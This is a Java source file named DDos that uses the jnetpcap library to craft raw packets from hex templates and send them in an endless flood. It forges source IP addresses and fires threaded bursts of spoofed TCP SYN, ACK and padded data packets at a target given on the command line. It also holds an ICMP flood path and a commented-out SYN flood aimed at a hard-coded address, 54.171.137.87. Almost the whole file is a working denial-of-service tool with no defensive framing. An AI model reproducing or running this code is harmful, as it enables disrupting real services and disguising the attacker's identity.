package ServerTracker;


import org.jnetpcap.Pcap;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.*;
import org.jnetpcap.packet.format.FormatUtils;
import org.jnetpcap.protocol.*;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.*;
import org.jnetpcap.protocol.tcpip.Tcp;

import java.net.*;
import java.util.Random;

/**
 * Created by jie on 4/1/16.
 */
public class DDos {

    DDos(int rate, String target) {
        init();
        SendPacket(rate, target);
        pcap.close();
    }


    Pcap pcap;
    byte[] srcmac;
    byte[] dstmac;

    public void init() {
        try {
            srcmac = NetworkInterface.getByName("wlan2").getHardwareAddress();
        } catch (SocketException e) {
            e.printStackTrace();
        }
        //dstmac= new byte[]{(byte)255, (byte)255, (byte)255, (byte)255, (byte)255,(byte)255};
        dstmac = new byte[]{(byte) 116, (byte) 68, (byte) 1, (byte) 134, (byte) 67, (byte) 67};
        StringBuilder errbuf = new StringBuilder();
        int snaplen = 64 * 1024; // Capture all packets, no trucation
        int flags = Pcap.MODE_PROMISCUOUS; // capture all packets
        int timeout = 10 * 1000; // 10 seconds in millis
        pcap = Pcap.openLive("wlan2", snaplen, flags, timeout, errbuf);
    }


    String payload = "7444018643435cc5d43e51750800450003b633a940004006ad3ac0a8011445404f62da070050b503d1ae72977b8f801800e5846000000101080a010fe11e4bce0a89";
    byte[] opt = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};

    /* public JPacket CreatePacket() {

         int l = 900 + random.nextInt(400);
         if(l%2==1){
             l++;
         }
         StringBuffer dup = new StringBuffer(payload);

         for (int i = payload.length(); i < l; i++) {
             dup.append(new String(new byte[]{opt[random.nextInt(15)]}));
         }



         JPacket packet =
                 new JMemoryPacket(JProtocol.ETHERNET_ID, dup.toString());
         // System.out.println(packet);
         //mac

         Ethernet ethhdr = packet.getHeader(new Ethernet());
         ethhdr.source(srcmac);
         ethhdr.destination(dstmac);
         //ip
         Ip4 ip = packet.getHeader(new Ip4());
         ip.length( packet.getTotalSize()-358);
         //random ip source
         ip.source(getRandomIP());
         //ip dest
         try {
             ip.destination(InetAddress.getByName("54.171.137.87").getAddress());
         } catch (UnknownHostException e) {
             e.printStackTrace();
         }
         ip.checksum(ip.calculateChecksum());

         //tcp
         Tcp tcp = packet.getHeader(new Tcp());
         tcp.flags_SYN(true);
         tcp.source(random.nextInt(65530));
         tcp.seq(random.nextLong());

         //tcp.ack(random.nextLong());
         tcp.window(random.nextInt(65500));
         tcp.checksum(tcp.calculateChecksum());
         //finish
         packet.scan(Ethernet.ID);
         //   System.out.println(packet);
         return packet;
     }*/
    String TCPSYN = "d476ea0ba5785cc5d43e517508004500003c7abe400040063defc0a8016436ab8957d07e00501335faec00000000a0027210f26b0000020405b40402080a023280520000000001030307";

    public JPacket CreateTCPsyn(byte[] srcip, String dstip, int srcport) {
        JPacket packet =
                new JMemoryPacket(JProtocol.ETHERNET_ID, TCPSYN);
        Ip4 ip = packet.getHeader(new Ip4());
        //random ip source
        ip.source(srcip);
        //ip dest
        try {
            ip.destination(InetAddress.getByName(dstip).getAddress());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        ip.length(TCPSYN.length() / 2 - 14);
        ip.checksum(ip.calculateChecksum());

        //tcp
        Tcp tcp = packet.getHeader(new Tcp());
        tcp.source(srcport);
        tcp.checksum(tcp.calculateChecksum());
        packet.scan(Ethernet.ID);
        return packet;
    }

    String TCPACK = "d476ea0ba5785cc5d43e5175080045000034afd84000400608ddc0a8016436ab8957d08a005006d1eecc0213487e801000e57be600000101080a02344120000c2379";

    public JPacket CreateTCPack(byte[] srcip, String dstip, int sport) {
        JPacket packet =
                new JMemoryPacket(JProtocol.ETHERNET_ID, TCPACK);
        Ip4 ip = packet.getHeader(new Ip4());
        //random ip source
        ip.source(srcip);
        //ip dest
        try {
            ip.destination(InetAddress.getByName(dstip).getAddress());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        ip.length(TCPACK.length() / 2 - 14);
        ip.checksum(ip.calculateChecksum());

        //tcp
        Tcp tcp = packet.getHeader(new Tcp());
        tcp.source(sport);
        tcp.checksum(tcp.calculateChecksum());
        packet.scan(Ethernet.ID);
        return packet;
    }

    String TCPDATA = "d476ea0ba5785cc5d43e517508004500003bafd94000400608d5c0a8016436ab8957d08a005006d1eecc0213487e801800e5452800000101080a02344296000c2379";

    public JPacket CreateTCPdata(byte[] srcip, String dstip, int sport) {
        StringBuffer data = new StringBuffer(TCPDATA);
        for (int i = 0; i < 500; i++) {
            data.append("aaaaa");
        }
        JPacket packet =
                new JMemoryPacket(JProtocol.ETHERNET_ID, data.toString());
        Ip4 ip = packet.getHeader(new Ip4());
        //random ip source
        ip.source(srcip);
        //ip dest
        try {
            ip.destination(InetAddress.getByName(dstip).getAddress());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        ip.length(data.toString().length() / 2 - 14);
        ip.checksum(ip.calculateChecksum());

        //tcp
        Tcp tcp = packet.getHeader(new Tcp());
        tcp.source(sport);
        tcp.checksum(tcp.calculateChecksum());
        packet.scan(Ethernet.ID);
        return packet;
    }

    String icmppay = "d476ea0ba5785cc5d43e5175080045000054da6f40004001de2ac0a8016436ab8957080084be115200026addfe56000000002be60e0000000000101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637";

    public JPacket CreateICMPPacket() {
        StringBuffer copy = new StringBuffer(icmppay);
        for (int i = 0; i < 500; i++) {
            copy.append("aaaa");
        }
        JPacket packet =
                new JMemoryPacket(JProtocol.ETHERNET_ID, copy.toString());
        Ip4 ip = packet.getHeader(new Ip4());
        //random ip source
        ip.source(getRandomIP());
        //ip dest
        try {
            ip.destination(InetAddress.getByName("54.171.137.87").getAddress());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        ip.length(copy.length() / 2 - 14);
        ip.checksum(ip.calculateChecksum());
        Icmp icmp = packet.getHeader(new Icmp());
        icmp.checksum(icmp.calculateChecksum());
        packet.scan(Ethernet.ID);
        return packet;
    }

    Random random = new Random();

    public byte[] getRandomIP() {

        String[] a = new String[0];
        try {
            for (InterfaceAddress add : NetworkInterface.getByName("wlan2").getInterfaceAddresses()) {
                if (add.getAddress().getHostAddress().length() < 20) {
                    a = add.getAddress().getHostAddress().split("\\.");
                }
            }

        } catch (SocketException e) {
            e.printStackTrace();
        }
        try {
            InetAddress ip = InetAddress.getByName(a[0]
                    + "." + a[1]
                    + "." + a[2]
                    + "." + String.valueOf(random.nextInt(254)));
            //+ "." + a[3]);
            return ip.getAddress();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        return FormatUtils.toByteArray("00000000");
    }

    public void SendPacket(int rate, final String target) {
        long time = 0;
        int count = 0;
        for (; ; ) {
            count++;
            time = System.currentTimeMillis() + 1000;
            for (int i = 0; i < rate; i++) {
                if (true) {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            byte[] srcip = getRandomIP();
                            int sport = random.nextInt(65533);
                            try {
                                //JPacket pkt =
                                pcap.sendPacket(CreateTCPsyn(srcip, target, sport));
                                Thread.sleep(20);
                                pcap.sendPacket(CreateTCPack(srcip, target, sport));
                                Thread.sleep(20);
                                pcap.sendPacket(CreateTCPdata(srcip, target, sport));
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();
                    try {
                        Thread.sleep(1000l / rate);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                } else {
                    pcap.sendPacket(CreateICMPPacket());
                }
            }
            try {
                Thread.sleep(time - System.currentTimeMillis());
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (IllegalArgumentException e) {
                continue;
            }
            if(count>10){
                count=0;
                System.gc();

            }

        }

    }

    public static void main(String[] args) {
        new DDos(Integer.valueOf(args[0]), args[1]);
    }
}
